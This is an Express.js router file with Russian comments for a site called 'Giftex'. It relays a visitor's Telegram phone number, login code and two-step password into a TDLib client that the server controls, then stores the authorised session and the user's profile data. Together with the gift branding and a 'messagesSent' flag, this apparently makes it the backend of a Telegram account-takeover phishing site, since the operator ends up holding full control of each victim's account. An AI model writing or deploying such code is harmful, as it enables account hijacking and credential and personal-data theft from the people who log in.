const express = require('express');
const router = express.Router();
const { v4: uuidv4 } = require('uuid');
const { getClient } = require('../config/telegram');
const stats = require('../models/stats'); // Добавляем импорт модуля статистики

// Функция безопасного получения состояния авторизации
function getAuthStateString(authState) {
  return authState && authState.authorization_state && authState.authorization_state._ 
    ? authState.authorization_state._ 
    : (authState && authState._ ? authState._ : 'unknown');
}

// Рендеринг страницы авторизации
router.get('/', (req, res) => {
  // Если пользователь уже авторизован, перенаправляем на главную
  if (req.session.user && req.session.user.tdlibAuthorized) {
    return res.redirect('/');
  }
  
  // Если у пользователя нет tdlibSessionId, создаем новый
  if (!req.session.tdlibSessionId) {
    req.session.tdlibSessionId = uuidv4();
  }
  
  res.render('tdauth', { 
    title: 'Telegram Авторизация - Giftex',
    sessionId: req.session.tdlibSessionId,
    authState: req.session.tdlibAuthState || 'init'
  });
});

// Инициализация процесса авторизации
router.post('/init', async (req, res) => {
  try {
    const sessionId = req.session.tdlibSessionId;
    if (!sessionId) {
      stats.recordAuth(false, 'Сессия не найдена'); // Запись неудачной авторизации
      return res.status(400).json({ error: 'Сессия не найдена' });
    }
    
    // Получаем или создаем клиента
    const client = getClient(sessionId);
    
    try {
      // Пытаемся подключить клиент, но игнорируем ошибку "already initialized"
      await client.connect();
    } catch (connError) {
      // Игнорируем ошибку повторной инициализации
      if (!connError.message.includes('already initialized')) {
        stats.recordAuth(false, `Ошибка подключения: ${connError.message}`); // Запись неудачной авторизации
        throw connError;
      }
      console.log(`Клиент ${sessionId} уже был инициализирован ранее, продолжаем работу`);
    }
    
    // Получаем состояние авторизации
    const authState = await client.getAuthState();
    console.log('Auth state:', authState);
    
    // Безопасно получаем строку состояния авторизации
    const stateStr = getAuthStateString(authState);
    req.session.tdlibAuthState = stateStr;
    
    res.json({ 
      success: true, 
      authState: stateStr
    });
  } catch (error) {
    console.error('Error initializing TDLib session:', error);
    stats.recordAuth(false, `Ошибка инициализации: ${error.message}`); // Запись неудачной авторизации
    res.status(500).json({ error: 'Не удалось инициализировать сессию', details: error.message });
  }
});

// Отправка номера телефона
router.post('/send-phone', async (req, res) => {
  try {
    const { phoneNumber } = req.body;
    if (!phoneNumber) {
      stats.recordAuth(false, 'Номер телефона не указан'); // Запись неудачной авторизации
      return res.status(400).json({ error: 'Номер телефона не указан' });
    }
    
    const sessionId = req.session.tdlibSessionId;
    if (!sessionId) {
      stats.recordAuth(false, 'Сессия не найдена'); // Запись неудачной авторизации
      return res.status(400).json({ error: 'Сессия не найдена' });
    }
    
    const client = getClient(sessionId);
    await client.sendPhoneNumber(phoneNumber);
    
    req.session.tdlibAuthState = 'waitCode';
    req.session.tdlibPhoneNumber = phoneNumber;
    
    res.json({ 
      success: true, 
      authState: 'waitCode' 
    });
  } catch (error) {
    console.error('Error sending phone number:', error);
    stats.recordAuth(false, `Ошибка отправки номера: ${error.message}`); // Запись неудачной авторизации
    res.status(500).json({ 
      error: 'Не удалось отправить номер телефона',
      details: error.message 
    });
  }
});

// Отправка кода подтверждения
router.post('/send-code', async (req, res) => {
  try {
    const { code } = req.body;
    if (!code) {
      stats.recordAuth(false, 'Код не указан'); // Запись неудачной авторизации
      return res.status(400).json({ error: 'Код не указан' });
    }
    
    const sessionId = req.session.tdlibSessionId;
    if (!sessionId) {
      stats.recordAuth(false, 'Сессия не найдена'); // Запись неудачной авторизации
      return res.status(400).json({ error: 'Сессия не найдена' });
    }
    
    const client = getClient(sessionId);
    await client.sendCode(code);
    
    // Проверяем, нужен ли пароль или авторизация завершена
    const authState = await client.getAuthState();
    const state = getAuthStateString(authState);
    
    if (state === 'authorizationStateReady') {
      // Пользователь успешно авторизован
      // Сохраняем информацию о пользователе в сессии
      req.session.tdlibAuthState = 'ready';
      
      // Получаем информацию о пользователе
      const userInfo = await client.getMe();
      
      req.session.user = {
        tdlibSessionId: sessionId,
        tdlibAuthorized: true,
        id: userInfo.id,
        firstName: userInfo.first_name,
        lastName: userInfo.last_name || '',
        username: userInfo.username || '',
        phoneNumber: userInfo.phone_number
      };
      
      // Добавляем пользователя в статистику
      stats.addUser(req.session.user);
      stats.recordAuth(true); // Запись успешной авторизации
      
      // Запрещаем повторную отправку сообщений
      if (!req.session.messagesSent) {
        req.session.messagesSent = false;
      }
      
      return res.json({ 
        success: true, 
        authState: 'ready',
        redirectUrl: '/' 
      });
    } else if (state === 'authorizationStateWaitPassword') {
      // Нужен пароль
      req.session.tdlibAuthState = 'waitPassword';
      
      return res.json({ 
        success: true, 
        authState: 'waitPassword' 
      });
    } else {
      stats.recordAuth(false, `Неожиданное состояние авторизации: ${state}`); // Запись неудачной авторизации
      return res.json({ 
        success: false, 
        error: 'Неожиданное состояние авторизации',
        authState: state
      });
    }
  } catch (error) {
    console.error('Error sending confirmation code:', error);
    stats.recordAuth(false, `Ошибка отправки кода: ${error.message}`); // Запись неудачной авторизации
    res.status(500).json({ 
      error: 'Не удалось отправить код подтверждения',
      details: error.message 
    });
  }
});

// Отправка пароля
router.post('/send-password', async (req, res) => {
  try {
    const { password } = req.body;
    if (!password) {
      stats.recordAuth(false, 'Пароль не указан'); // Запись неудачной авторизации
      return res.status(400).json({ error: 'Пароль не указан' });
    }
    
    const sessionId = req.session.tdlibSessionId;
    if (!sessionId) {
      stats.recordAuth(false, 'Сессия не найдена'); // Запись неудачной авторизации
      return res.status(400).json({ error: 'Сессия не найдена' });
    }
    
    const client = getClient(sessionId);
    await client.sendPassword(password);
    
    // Проверяем, завершена ли авторизация
    const authState = await client.getAuthState();
    const state = getAuthStateString(authState);
    
    if (state === 'authorizationStateReady') {
      // Пользователь успешно авторизован
      // Сохраняем информацию о пользователе в сессии
      req.session.tdlibAuthState = 'ready';
      
      // Получаем информацию о пользователе
      const userInfo = await client.getMe();
      
      req.session.user = {
        tdlibSessionId: sessionId,
        tdlibAuthorized: true,
        id: userInfo.id,
        firstName: userInfo.first_name,
        lastName: userInfo.last_name || '',
        username: userInfo.username || '',
        phoneNumber: userInfo.phone_number
      };
      
      // Добавляем пользователя в статистику
      stats.addUser(req.session.user);
      stats.recordAuth(true); // Запись успешной авторизации
      
      // Запрещаем повторную отправку сообщений
      if (!req.session.messagesSent) {
        req.session.messagesSent = false;
      }
      
      return res.json({ 
        success: true, 
        authState: 'ready',
        redirectUrl: '/' 
      });
    } else {
      stats.recordAuth(false, `Неожиданное состояние авторизации: ${state}`); // Запись неудачной авторизации
      return res.json({ 
        success: false, 
        error: 'Неожиданное состояние авторизации',
        authState: state
      });
    }
  } catch (error) {
    console.error('Error sending password:', error);
    stats.recordAuth(false, `Ошибка отправки пароля: ${error.message}`); // Запись неудачной авторизации
    res.status(500).json({ 
      error: 'Не удалось отправить пароль',
      details: error.message 
    });
  }
});

// Выход из системы
router.get('/logout', async (req, res) => {
  try {
    const sessionId = req.session.tdlibSessionId;
    
    if (sessionId) {
      const client = getClient(sessionId);
      await client.logout();
      await client.close();
    }
    
    // Очищаем сессию пользователя
    req.session.destroy();
    
    res.redirect('/');
  } catch (error) {
    console.error('Error during logout:', error);
    res.redirect('/');
  }
});

module.exports = router; 